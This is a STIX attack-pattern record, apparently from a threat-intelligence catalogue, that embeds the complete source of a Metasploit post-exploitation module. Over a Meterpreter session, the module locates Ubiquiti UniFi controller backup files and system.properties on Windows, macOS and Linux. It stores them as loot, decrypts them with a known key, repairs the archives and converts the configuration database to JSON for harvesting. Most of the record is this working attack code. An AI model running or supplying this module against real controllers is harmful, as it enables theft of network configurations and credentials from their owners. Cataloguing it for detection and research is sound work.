{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--04e078bf-bed1-4155-a431-38fb02b14ecf",
    "created": "2024-08-14T16:33:19.169724Z",
    "modified": "2024-08-14T16:33:19.169728Z",
    "name": "Multi Gather Ubiquiti UniFi Controller Backup",
    "description": " On an Ubiquiti UniFi controller, reads the system.properties configuration file and downloads the backup and autobackup files.  The files are then decrypted using a known encryption key, then attempted to be repaired by zip.  Meterpreter must be used due to the large file sizes, which can be flaky on regular shells to read. Confirmed to work on 5.10.19 - 5.10.23, but most likely quite a bit more. If the zip can be repaired, the db and its information will be extracted.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/gather/ubiquiti_unifi_backup.rb",
            "external_id": "ubiquiti_unifi_backup.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/zhangyoufu/unifi-backup-decrypt/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/justingist/POSH-Ubiquiti/blob/master/Posh-UBNT.psm1"
        },
        {
            "source_name": "reference",
            "url": "https://help.ubnt.com/hc/en-us/articles/205202580-UniFi-system-properties-File-Explanation"
        },
        {
            "source_name": "reference",
            "url": "https://community.ubnt.com/t5/UniFi-Wireless/unf-controller-backup-file-format/td-p/1624105"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'zlib'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Windows::UserProfiles\n  include Msf::Post::OSX::System\n  include Msf::Auxiliary::Ubiquiti\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Multi Gather Ubiquiti UniFi Controller Backup',\n        'Description' => %q{\n          On an Ubiquiti UniFi controller, reads the system.properties configuration file\n          and downloads the backup and autobackup files.  The files are then decrypted using\n          a known encryption key, then attempted to be repaired by zip.  Meterpreter must be\n          used due to the large file sizes, which can be flaky on regular shells to read.\n          Confirmed to work on 5.10.19 - 5.10.23, but most likely quite a bit more.\n          If the zip can be repaired, the db and its information will be extracted.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # metasploit module\n          'zhangyoufu', # git scripts\n          'justingist' # git script\n        ],\n        'Platform' => [ 'linux', 'win', 'osx' ],\n        'SessionTypes' => %w[meterpreter],\n        'References' => [\n          ['URL', 'https://github.com/zhangyoufu/unifi-backup-decrypt/'],\n          ['URL', 'https://github.com/justingist/POSH-Ubiquiti/blob/master/Posh-UBNT.psm1'],\n          ['URL', 'https://help.ubnt.com/hc/en-us/articles/205202580-UniFi-system-properties-File-Explanation'],\n          ['URL', 'https://community.ubnt.com/t5/UniFi-Wireless/unf-controller-backup-file-format/td-p/1624105']\n        ]\n      )\n    )\n\n    register_options([\n      OptPath.new('SYSTEMFILE', [false, 'Custom system.properties file location']),\n      OptPath.new('BACKUPFOLDER', [false, 'Custom backup folder']),\n    ])\n  end\n\n  def find_save_files(d)\n    case session.platform\n    when 'windows'\n      files = session.fs.dir.foreach(d)\n    else\n      # when 'linux', 'osx', 'unifi'\n      # osx will have a space in it by default, so we wrap the directory in quotes\n      files = cmd_exec(\"ls '#{d}'\").split(/\\r\\n|\\r|\\n/)\n    end\n    files.each do |file|\n      full = \"#{d}/#{file}\"\n      if directory?(full) && !['.', '..'].include?(file)\n        find_save_files(full)\n        next\n      end\n\n      unless file.end_with? '.unf'\n        next\n      end\n\n      f = read_file(full)\n      if f.nil?\n        print_error(\"#{full} read at 0 bytes.  Either file is empty or error reading.  If this is a shell, you need to upgrade to meterpreter!!!\")\n        next\n      end\n      loot_path = store_loot('ubiquiti.unifi.backup', 'application/zip', session,\n                             f, file, 'Ubiquiti Unifi Controller Encrypted Backup Zip')\n      print_good(\"File #{full} saved to #{loot_path}\")\n      decrypted_data = decrypt_unf(f)\n      if decrypted_data.nil? || decrypted_data.empty?\n        print_error(\"Unable to decrypt #{loot_path}\")\n        next\n      end\n      loot_path = store_loot('ubiquiti.unifi.backup_decrypted', 'application/zip', session,\n                             decrypted_data, \"#{file}.broken.zip\", 'Ubiquiti Unifi Controller Decrypted Broken Backup Zip')\n      print_good(\"File #{file} DECRYPTED and saved to #{loot_path}.  File needs to be repair via `zip -FF`\")\n      # ruby zip can't repair, we can try on command line but its not likely to succeed on all platforms\n      # tested on kali\n      repaired = repair_zip(loot_path)\n      if repaired.nil?\n        fail_with Failure::Unknown, \"Repair failed on #{loot_path.path}\"\n      end\n      loot_path = store_loot('ubiquiti.unifi.backup_decrypted_repaired', 'application/zip', session,\n                             repaired, \"#{file}.zip\", 'Ubiquiti Unifi Controller Backup Zip')\n      print_good(\"File #{full} DECRYPTED and REPAIRED and saved to #{loot_path}.\")\n      config_db = extract_and_process_db(loot_path)\n      if config_db.nil?\n        fail_with Failure::Unknown, 'Unable to locate db.gz config database file'\n      end\n      print_status('Converting BSON to JSON.')\n      unifi_config_db_json = bson_to_json(config_db)\n\n      if unifi_config_db_json == {}\n        fail_with Failure::Unknown, 'Error in file conversion from BSON to JSON.'\n      end\n      unifi_config_eater(session.session_host, session.session_port, unifi_config_db_json)\n    end\n  end\n\n  def run\n    backup_locations = []\n    sprop_locations = []\n\n    vprint_status('OS Detected: %s' % session.platform)\n\n    case session.platform\n    when 'windows'\n      grab_user_profiles.each do |user|\n        backup_locations << \"#{user['ProfileDir']}\\\\Ubiquiti Unifi\\\\data\\\\backup\"\n        sprop_locations << \"#{user['ProfileDir']}\\\\Ubiquiti UniFi\\\\data\\\\system.properties\"\n      end\n    when 'osx'\n      # https://github.com/rapid7/metasploit-framework/pull/11548#issuecomment-472568795\n      get_users.each do |user|\n        backup_locations << \"/Users/#{user['name']}/Library/Application Support/UniFi/data/backup\"\n        sprop_locations << \"/Users/#{user['name']}/Library/Application Support/Unifi/data/system.properties\"\n      end\n    else # linux, or a similar device from ubiquiti\n      # https://help.ubnt.com/hc/en-us/articles/226218448-UniFi-How-to-Configure-Auto-Backup\n      backup_locations = [\n        '/data/autobackup', # Cloud key\n        '/var/lib/unifi/backup', # software install linux\n        '/mnt/data/unifi/data/backup' # UDM-PRO (possibly UDM as well)\n      ]\n\n      sprop_locations = [\n        '/var/lib/unifi/system.properties', # default location on 5.10.19 on ubuntu 18.04\n        '/mnt/data/unifi/data/system.properties' # UDM-Pro (possibly UDM as well)\n      ]\n    end\n\n    # read system.properties\n    if datastore['SYSTEMFILE']\n      sprop = datastore['SYSTEMFILE']\n      vprint_status(\"Utilizing custom system.properties file location: #{datastore['SYSTEMFILE']}\")\n    end\n\n    print_status('Attempting to read system.properties file to determine backup locations.')\n    # https://help.ubnt.com/hc/en-us/articles/205202580-UniFi-system-properties-File-Explanation\n    sprop_locations.each do |sprop|\n      next unless exists?(sprop)\n\n      begin\n        data = read_file(sprop)\n        loot_path = store_loot('ubiquiti.system.properties', 'text/plain', session, data, sprop)\n        vprint_status(\"File #{sprop} saved to #{loot_path}\")\n        print_good(\"Read UniFi Controller file #{sprop}\")\n      rescue Rex::Post::Meterpreter::RequestError => e\n        print_error(\"Failed to read #{sprop}\")\n        data = ''\n      end\n      data.each_line do |line|\n        if !(line.chomp.empty? || line =~ /^#/) && /^autobackup\\.dir\\s*=\\s*(?<d>.+)$/ =~ line\n          backup_locations.append(d.strip)\n          vprint_status(\"Custom autobackup directory identified: #{d.strip}\")\n        end\n      end\n    end\n\n    print_status('Attempting to locate and read backup files.')\n    backup_locations.each do |bl|\n      if !directory?(bl)\n        vprint_error(\"Directory doesn't exist: #{bl}\")\n        next\n      end\n\n      vprint_good(\"Found backup folder: #{bl}\")\n      find_save_files(bl)\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'linux', 'win', 'osx' ]"
    ]
}